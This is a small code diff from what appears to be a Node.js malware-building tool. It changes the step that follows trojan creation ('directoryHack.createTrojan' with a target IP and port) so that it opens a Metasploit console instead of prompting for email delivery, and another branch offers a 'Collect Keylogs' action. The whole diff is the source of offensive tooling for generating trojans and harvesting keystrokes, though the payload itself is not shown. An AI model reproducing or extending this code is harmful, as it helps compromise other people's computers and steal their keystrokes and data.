@@ -7,6 +7,7 @@ const Q = require("q");
 const { getIp } = require("./helpers/Get_Ip_Address");
 const deferred = Q.defer();
 const { emailPrompt } = require("./helpers/Email_Service");
+const {openConsole} = require("./helpers/OpenMsfConsole");
 
 // TODO Program should set parameters and open clien within terminal
 
@@ -32,7 +33,7 @@ const main = () => {
           console.log("   Using ip", ip);
           console.log("   Using port", port);
           directoryHack.createTrojan(exec, Q, address).then(() => {
-            emailPrompt(address);
+            openConsole(exec, address);
           });
         });
       } else if (answers.action === "Collect Keylogs") {
